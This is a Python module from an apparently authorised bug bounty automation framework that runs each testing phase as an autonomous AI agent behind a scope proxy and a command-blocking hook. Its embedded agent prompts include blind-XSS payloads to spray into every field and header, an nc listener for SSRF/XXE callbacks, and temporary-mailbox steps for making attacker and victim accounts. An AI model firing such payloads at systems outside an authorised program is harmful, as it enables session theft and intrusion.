"""Run a phase as an AI agent (the core of the rebuilt system).

Each testing phase is an AI session that decides what to do and does it, with
the toolkit (`hk`) and the recon tools on its PATH. Three things keep it safe,
and none of them depend on the AI behaving:

1. The scope proxy. Every request to a target goes through it; out-of-scope
   traffic is blocked at the network layer. Passive data sources and the model
   API bypass it (they are not targets).
2. The command checker (hunter/guard_hook.py), wired as a PreToolUse hook: it
   reads each command before it runs and blocks out-of-scope hosts, anything
   that would switch the proxy off, port scanners, brute forcing, and the run's
   own controls. Exit 2 stops the command and tells the agent why.
3. The orchestrator. It still owns phase order, scope, rate, state, resume and
   completion; the AI only works inside one phase.

The agent records everything through `hk` (scope-checked writes to the shared
inventory) and writes a short handoff for the next phase. After it exits, the
phase verifies the expected outputs exist; if not, it returns PARTIAL/BLOCKED
with what is missing, so a later start sends the agent back in.
"""

from __future__ import annotations

import json
import os
from pathlib import Path

from . import paths
from . import runcontract
from .runcontract import MustStep
from .toolchain import tools_dir
from . import state as st
from .phases.base import Context, Phase, PhaseResult

# Prepended to the phase prompt: the rules and the toolkit, same for every phase.
PREAMBLE = """You are one phase of an automated, AUTHORISED bug bounty run against a single
program the researcher is allowed to test. You are an experienced bug bounty
hunter. Work on your own: choose what to run, read the results, notice problems
and fix your approach, follow what looks interesting, and stop when this phase
is done. No human is watching, so never wait for input.

Scope and rules (this is what the program authorises):
{scope_summary}

Hard limits, enforced in code (not just asked of you):
- Every request to a target goes through a scope proxy. Out-of-scope hosts are
  blocked; do not try to disable, unset or change the proxy (*_PROXY variables,
  --noproxy, proxychains): those commands are refused.
- A checker reads each command before it runs. It blocks out-of-scope hosts,
  port scanners (use `hk portscan`), brute forcing (never allowed), and the
  run's own files. If a command is blocked you will see the reason; adjust and
  continue, do not fight it.
- Stay within the program rules above. Do only what is needed to show a problem
  is real: a minimal, non-destructive proof of concept. Never exfiltrate real
  user data, never run denial of service, never change or delete data you did
  not create. When a rule is unclear, treat it as not allowed and record a note.

Your toolkit is `hk` (run `hk help`). Use it for everything that must be
remembered, because only `hk` writes to the shared inventory the next phases
read, and every write is scope-checked:
- read: hk scope / hk scope check <url> / hk stats / hk hosts / hk services /
  hk endpoints / hk leads / hk handoff
- run tool, then import: e.g. `httpx -l hosts.txt -json -o out.jsonl` then
  `hk import httpx out.jsonl`. Importers: subfinder, dnsx, httpx, katana, ffuf.
- record: hk add host|endpoint|lead, hk priority, hk filter, hk mark
- built-in safe checks: hk portscan, hk baseline, hk check-content <url>,
  hk takeover, hk wordlist
- report: hk progress "<step>" <done> <total> <unit>; hk notify "<title>"
  "<msg>" (Discord, secrets masked); hk note "<text>"

Installed tools on your PATH (they already route through the proxy): subfinder,
dnsx, httpx, katana, ffuf, plus curl, jq, python3, and the usual shell. Call
them by name. For a port scan use `hk portscan`, never nmap/masscan.
{infra}{prior}
Work in this directory. Save tool output to files here and import it; do not
paste large output back to yourself. Call `hk progress` as you go so the
operator can see how far along you are.

== YOUR TASK FOR THIS PHASE ==
{task}

When you are done, write a short plain-English summary to ./handoff.md for the
next phase: what you found, what is worth a closer look, and anything you could
not finish. Then reply DONE.
"""


PRIOR_HELP = """
== PRIOR AUTOMATION OUTPUT (reference only) ==
A previous automation run left its results in {dir}. Use it as REFERENCE AND HINTS ONLY, never as truth:
- Mine it for things that help THIS phase - known hosts/subdomains, endpoints, parameters, leads, past
  findings - and pull the useful ones into the inventory with `hk` (add host / endpoint / lead). Everything
  you add is scope-checked and will be re-verified by this run.
- NEVER trust its testing. Treat any 'finding', 'confirmed' or 'vulnerable' in it as an UNVERIFIED lead to
  reproduce from scratch. Do all testing yourself; a result is real only when THIS run proves it.
- It can be large: grep/scan it selectively, do not cat huge files into your context.
"""

# A TIGHT prior block for recon/mapping phases: only mine it for KNOWN HOSTS, and
# only quickly - never get pulled into reading old findings/notes. The full
# mining (endpoints, params, leads, past findings) belongs to the testing phases.
PRIOR_HELP_HOSTS = """
== PRIOR AUTOMATION OUTPUT (hosts only, reference) ==
A previous run left results in {dir}. For THIS phase, use it ONLY to harvest known
host/subdomain names: `grep -rhoE '[a-z0-9.-]+\\.[a-z]+' {dir} | sort -u`, then add the
in-scope ones with `hk add host`. Do NOT read its findings, notes or testing here - that
is for later phases. This is a quick hint source, not your main task; your main task is the
fresh enumeration below.
"""

MAILBOX_HELP = """Temporary mailboxes (mail.tm) for sign-up, password-reset and OTP flows, and for making
attacker/victim accounts for access-control testing. Use them ONLY when the program allows signing up
with any email; if the policy requires a platform relay address (Intigriti @intigriti.me, Bugcrowd
@bugcrowdninja.com, HackerOne <handle>@wearehackerone.com), use that instead (see the scope rules and your
researcher handle). Steps:
  GET  https://api.mail.tm/domains                          (pick a domain)
  POST https://api.mail.tm/accounts   body {"address":"victim-<epoch>@<domain>","password":"TestPassword123!"}
  POST https://api.mail.tm/token      body {"address":"<email>","password":"TestPassword123!"}  -> bearer token
  GET  https://api.mail.tm/messages            -H "Authorization: Bearer <token>"   (list)
  GET  https://api.mail.tm/messages/<id>       -H "Authorization: Bearer <token>"   (read)
Use clear prefixes (attacker-, victim-, reset-). Extract OTPs / magic links and continue the flow."""

OOB_HELP = """Out-of-band / SSRF / XXE listener: your own server at {host} (replaces Burp Collaborator).
Start a listener on this VPS when you need one: `python3 -m http.server {port}` or `nc -lvnp {port}`
(ports {ports}). Point payloads at http://{host}:{port}/<unique-token-per-test> so each callback is
attributable. After sending the payload to the target, check the listener log to confirm the callback and
save those log lines as evidence on the finding. Stop the listener when done. Use for SSRF, blind XXE and
any blind/OOB vulnerability."""

BLIND_XSS_HELP = """Blind XSS: inject beacons pointing at {url} into EVERY text field, parameter and header
(User-Agent, Referer), and any name / profile / address / comment / support-message field that staff or an
admin might later view. Blind XSS is high value and often missed, so spray it widely wherever you submit
input - within scope and the rate limit. A callback to the collector is the proof (the operator watches
it). Use several payload forms, for example:
  "'><script src={url}></script>
  "><img src=x onerror=import('{url}')>
  javascript:import('{url}')
Also send it as the User-Agent on ordinary requests to catch log-viewer XSS. For each place you inject,
record a lead (hk add lead blind-xss <endpoint> --evidence "beacon in <field>") so a later callback can be
traced back after this phase ends."""

BROWSER_HELP = """Headless browser (`hbrowse`): a real Chromium that runs THROUGH the scope proxy, for anything curl
cannot show - DOM / client-side XSS, open redirects that actually land, postMessage and window.name PoCs,
and authenticated or stored-XSS flows (pass a session cookie). Every request it makes is scope-checked,
rate-limited and logged like any other, and uses the residential egress if one is set. Usage:
  hbrowse <url> [--window-name NAME] [--cookie 'k=v; k2=v2'] [--header 'K: V'] [--eval 'JS expression']
          [--click 'CSS selector'] [--wait MS] [--screenshot]
It prints JSON: final URL, HTTP status, page title, any JS dialog that fired (alert/confirm/prompt = XSS
proof), console messages, the result of --eval, and any callback the page made to your OOB / blind-XSS
host; it saves dom.html (and a screenshot with --screenshot) in the current directory. Use it to CONFIRM
client-side leads end-to-end - e.g. set --window-name to trip an inspector/preview gate, --eval to read a
DOM sink, a session --cookie to reach authenticated pages - instead of leaving them as untested leads."""


class AgentPhase(Phase):
    """Base for a phase driven by an AI agent. Subclasses set id/name/version/
    requires, `role` (which model tier), and `task(ctx)` (the phase's goal).
    They may override `check(ctx)` to decide the result from the inventory."""

    role = "scanner"
    max_turns = 120
    timeout_minutes = 120
    # Extra non-target hosts this phase may reach (merged into the command
    # checker allowlist), and secrets to export into the agent env.
    allow_hosts: tuple[str, ...] = ()
    secret_env: dict[str, str] = {}
    # How much of a prior-automation folder this phase mines: "full" (hosts,
    # endpoints, params, leads, findings - for testing phases) or "hosts" (only
    # known host names, a quick hint - for recon/mapping, so the agent is not
    # pulled off its enumeration job into reading old findings) or "none".
    prior_scope: str = "full"

    def task(self, ctx: Context) -> str:  # pragma: no cover - interface
        raise NotImplementedError

    def must_steps(self, ctx: Context) -> list[MustStep]:
        """The phase's MANDATORY RUN CONTRACT: the must-run steps, each ending in
        an artifact the phase can verify. Rendered as a checklist at the TOP of
        the task so the critical steps are always in the first screen the agent
        reads (the "first 150 lines" problem). Empty = no contract header (the
        task prose stands alone); every real testing phase should define it."""
        return []

    def _full_task(self, ctx: Context) -> str:
        """Contract checklist (if any) + the phase's detailed task prose."""
        header = runcontract.render_contract(self.must_steps(ctx))
        body = self.task(ctx)
        return f"{header}\n{body}" if header else body

    def missing_artifacts(self, ctx: Context) -> list[str]:
        """Contract artifacts not yet produced - for check() to return PARTIAL
        instead of a false DONE when the agent stopped early."""
        return runcontract.artifacts_present(self._workdir(ctx), self.must_steps(ctx))

    def check(self, ctx: Context, store) -> PhaseResult:
        """Default: DONE when the handoff exists AND every contract artifact is
        present; otherwise PARTIAL (resume)."""
        missing = self.missing_artifacts(ctx)
        if (self._workdir(ctx) / "handoff.md").exists() and not missing:
            return PhaseResult(st.DONE, "phase completed")
        detail = f"; missing {', '.join(missing)}" if missing else ""
        return PhaseResult(st.PARTIAL, "the agent did not finish; it will continue on the next start" + detail)

    # ------------------------------------------------------------------ run
    def run(self, ctx: Context) -> PhaseResult:
        if not ctx.target.scope_file.exists():
            return PhaseResult(st.BLOCKED, "scope.json is missing; intake must run again")
        proxy = ctx.proxy()                       # make sure the guard is up
        workdir = self._workdir(ctx)
        workdir.mkdir(parents=True, exist_ok=True)
        self._write_settings(ctx, workdir)
        env = self._env(ctx, proxy, workdir)
        scope_summary = self._scope_summary(ctx)
        prompt = PREAMBLE.format(scope_summary=scope_summary, infra=self._infra(ctx),
                                 prior=self._prior(ctx), task=self._full_task(ctx))
        agent_cfg = ctx.settings.get("agent", {})
        minutes = float(agent_cfg.get("phase_minutes", {}).get(self.id, self.timeout_minutes))
        turns = int(agent_cfg.get("phase_turns", {}).get(self.id, self.max_turns))
        ctx.log(f"AI phase {self.id}: starting ({self.role}, up to {minutes:.0f} min)")
        ctx.progress(f"{self.name}: the AI is working", None, None)
        result = ctx.agent(self.role, prompt, name=self.id, workdir=workdir, base_env=env,
                           bare=False, max_turns=turns, timeout_minutes=minutes,
                           add_dirs=[workdir])
        self._save_handoff(ctx, workdir)
        if result.fatal:
            return PhaseResult(st.BLOCKED, f"model error: {result.error}")
        outcome = self.check(ctx, ctx.assets())
        ctx.log(f"AI phase {self.id}: {outcome.status} - {outcome.summary}")
        return outcome

    def outputs_present(self, ctx: Context) -> bool:
        return (self._workdir(ctx) / "handoff.md").exists()

    # -------------------------------------------------------------- helpers
    def _workdir(self, ctx: Context) -> Path:
        return ctx.target.output / "phases" / self.id / "work"

    def _env(self, ctx: Context, proxy, workdir: Path) -> dict:
        env = proxy.env()                         # proxy + CA for all target traffic
        tools = str(tools_dir())
        bindir = str(paths.REPO_DIR / "bin")
        env["PATH"] = os.pathsep.join(p for p in (bindir, tools, env.get("PATH", "")) if p)
        env["HUNTER_TARGET_DIR"] = str(ctx.target.path)
        prior = ctx.target.prior_dir()
        if prior:
            env["HUNTER_PRIOR_DIR"] = str(prior)
        env["HUNTER_PHASE"] = self.id
        env["HUNTER_SCOPE_FILE"] = str(ctx.target.scope_file)
        # Resolver rate ceiling for dnsx (public resolvers bypass the proxy, so
        # the command checker enforces this). Low-automation programs get a
        # gentler cap.
        recon_cfg = ctx.settings.get("recon", {}) or {}
        dns_rps = int(recon_cfg.get("dnsx_rps", 150))
        if ctx.scope().rules.get("low_automation"):
            dns_rps = min(dns_rps, int(recon_cfg.get("dnsx_rps_low_automation", 25)))
        env["HUNTER_DNS_MAX_RPS"] = str(dns_rps)
        env["HUNTER_PROTECTED"] = os.pathsep.join(str(p) for p in (
            ctx.target.scope_file, ctx.target.output / "avoid.json", ctx.target.state_db, tools))
        env["HUNTER_HOOK_LOG"] = str(ctx.target.logs / "hook-blocks.jsonl")
        env["HUNTER_NOTES_FILE"] = str(workdir / "notes.md")
        scope = ctx.scope()
        ua = next((v for k, v in scope.required_headers.items() if k.lower() == "user-agent"), "")
        env["HUNTER_USER_AGENT"] = ua or "Mozilla/5.0"
        oob = ctx.settings.get("oob", {}) or {}
        oob_hosts = []
        if oob.get("enabled", True):
            if oob.get("callback_host"):
                oob_hosts.append(str(oob["callback_host"]))
                env["HUNTER_OOB_HOST"] = str(oob["callback_host"])
                env["HUNTER_OOB_PORTS"] = ",".join(str(p) for p in oob.get("listener_ports", []))
            if oob.get("blind_xss_url"):
                from urllib.parse import urlsplit
                env["HUNTER_BLIND_XSS_URL"] = str(oob["blind_xss_url"])
                host = urlsplit(str(oob["blind_xss_url"])).hostname
                if host:
                    oob_hosts.append(host)
            if oob.get("temp_mail", True):
                env["HUNTER_TEMP_MAIL"] = "1"
        browser = ctx.settings.get("browser", {}) or {}
        env["HUNTER_BROWSER"] = "1" if browser.get("enabled", True) else "0"
        extra = list(ctx.settings.get("agent", {}).get("extra_hosts", [])) + oob_hosts + list(self.allow_hosts)
        env["HUNTER_EXTRA_HOSTS"] = ",".join(extra)
        for secret_name, env_name in self.secret_env.items():
            value = ctx.secrets.get(secret_name)
            if value:
                env[env_name] = value
        return env

    def _write_settings(self, ctx: Context, workdir: Path) -> None:
        """A project settings file in the agent's cwd that wires the command
        checker as a PreToolUse hook on Bash and WebFetch."""
        python = str(paths.REPO_DIR / ".venv" / "bin" / "python")
        hook = f"{python} {paths.REPO_DIR / 'hunter' / 'guard_hook.py'}"
        settings = {
            "hooks": {
                "PreToolUse": [
                    {"matcher": "Bash|WebFetch",
                     "hooks": [{"type": "command", "command": hook, "timeout": 20}]},
                ]
            }
        }
        claude_dir = workdir / ".claude"
        claude_dir.mkdir(parents=True, exist_ok=True)
        (claude_dir / "settings.json").write_text(json.dumps(settings, indent=2), encoding="utf-8")

    def _prior(self, ctx: Context) -> str:
        """Reference block pointing the agent at a previous automation's output
        (if the operator dropped one in the target folder). Scoped per phase so
        recon/mapping get only a tight hosts-only hint and are not pulled off
        task into reading old findings. Empty otherwise."""
        prior = ctx.target.prior_dir()
        if not prior or self.prior_scope == "none":
            return ""
        template = PRIOR_HELP_HOSTS if self.prior_scope == "hosts" else PRIOR_HELP
        return template.format(dir=prior)

    def _infra(self, ctx: Context) -> str:
        """Your own testing infrastructure, offered to the agent and gated on the
        program rules: the agent uses each only where the policy allows."""
        oob = ctx.settings.get("oob", {}) or {}
        browser = ctx.settings.get("browser", {}) or {}
        oob_on = oob.get("enabled", True)
        browser_on = browser.get("enabled", True)
        if not oob_on and not browser_on:
            return ""
        parts = ["", "== YOUR TESTING INFRASTRUCTURE (yours, not targets - already allowed through the guard) =="]
        if oob_on:
            if oob.get("temp_mail", True):
                parts.append(MAILBOX_HELP)
            if oob.get("callback_host"):
                ports = oob.get("listener_ports") or [80, 8080]
                parts.append(OOB_HELP.format(host=oob["callback_host"], port=ports[0],
                                             ports=", ".join(str(p) for p in ports)))
            if oob.get("blind_xss_url"):
                parts.append(BLIND_XSS_HELP.format(url=oob["blind_xss_url"]))
        if browser_on:
            parts.append(BROWSER_HELP)
        parts.append("Never aim this infrastructure at anything out of scope; the scope and rate rules still apply.")
        return "\n".join(parts) + "\n"

    def _scope_summary(self, ctx: Context) -> str:
        scope = ctx.scope()
        rules = scope.rules
        lines = [
            "In scope: " + (", ".join(a.raw for a in scope.in_scope) or "(none listed)"),
            "Out of scope: " + (", ".join(a.raw for a in scope.out_of_scope) or "(none)"),
        ]
        if scope.operator_out:
            lines.append("Never touch (operator): " + ", ".join(a.raw for a in scope.operator_out))
        lines.append(f"Max request rate: {scope.rate_limit_rps} per second (the proxy enforces this).")
        if rules.get("required_headers"):
            lines.append("Required headers: " + ", ".join(f"{k}: {v}" for k, v in rules["required_headers"].items()))
        if scope.forbidden_actions:
            lines.append("Forbidden: " + "; ".join(scope.forbidden_actions))
        if scope.excluded_vulnerabilities:
            lines.append("Not accepted (do not report): " + "; ".join(scope.excluded_vulnerabilities))
        if scope.other_rules:
            lines.append("Other rules: " + "; ".join(scope.other_rules))
        if rules.get("low_automation"):
            lines.append("This program limits automated scanning: keep automation light.")
        return "\n".join(lines)

    def _save_handoff(self, ctx: Context, workdir: Path) -> None:
        src = workdir / "handoff.md"
        if src.exists():
            dest = ctx.target.output / "handoff"
            dest.mkdir(parents=True, exist_ok=True)
            (dest / f"{self.id}.md").write_text(src.read_text(encoding="utf-8", errors="replace"),
                                                encoding="utf-8")
